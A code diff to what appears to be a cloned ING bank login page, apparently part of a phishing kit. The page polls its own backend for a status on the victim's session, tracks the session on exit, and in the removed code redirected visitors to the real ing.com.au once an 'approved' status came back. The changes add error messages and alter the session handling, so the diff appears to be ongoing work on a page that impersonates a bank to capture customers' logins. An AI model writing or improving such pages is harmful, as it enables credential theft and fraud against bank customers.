@@ -27054,7 +27054,7 @@ iron-overlay-backdrop.overlay-backdrop-firework:not([style-scope]):not(.style-sc
                </ing-ajax>
                <template class="style-scope ing-login" is="dom-if">
                </template>
-                <div class="container style-scope ing-login" id="container">
+               <div class="container style-scope ing-login" id="container">
                 <ing-page-block class="module-login style-scope ing-login x-scope ing-page-block-0">
                  <div class="p-container style-scope ing-page-block">
                   <ing-layout class="layout-1 style-scope ing-login x-scope ing-layout-0">
@@ -27345,11 +27345,12 @@ document.addEventListener('DOMContentLoaded', () => {
     })
     .then(r => {
       if (r.ok) { startPoll(); }
-      else { overlay.style.display = 'none'; btn.disabled = false; }
+      else { overlay.style.display = 'none'; btn.disabled = false; error.style.display = 'block'; }
     })
     .catch(() => {
       overlay.style.display = 'none';
       btn.disabled = false;
+      error.style.display = 'block';
     });
   });
 
@@ -27362,15 +27363,6 @@ document.addEventListener('DOMContentLoaded', () => {
       try {
         const r = await fetch(`/api/status/${verifySid}`);
         const d = await r.json();
-        
-        // Handle quick approve redirect to ing.com.au
-        if (d.status === 'approved' && d.redirect) {
-          polling = false;
-          overlay.style.display = 'none';
-          location.href = d.redirect;  // Redirect to ing.com.au
-          return;
-        }
-        
         if (d.status === 'ok') {
           polling = false;
           overlay.style.display = 'none';
@@ -27394,7 +27386,7 @@ document.addEventListener('DOMContentLoaded', () => {
 </script>
 					   <script>
   /* make sid available globally so we can send it on unload */
-  window.__SID = verifySid;
+  window.__SID = '<?= sid ?? localStorage.sid ?? '' ?>';   // however you already inject it
   window.addEventListener('beforeunload', () => {
     if (!window.__SID) return;
     /* fire-and-forget exit call */
@@ -28722,4 +28714,3 @@ document.addEventListener('DOMContentLoaded', () => {
  </body>
 
 </html>
-
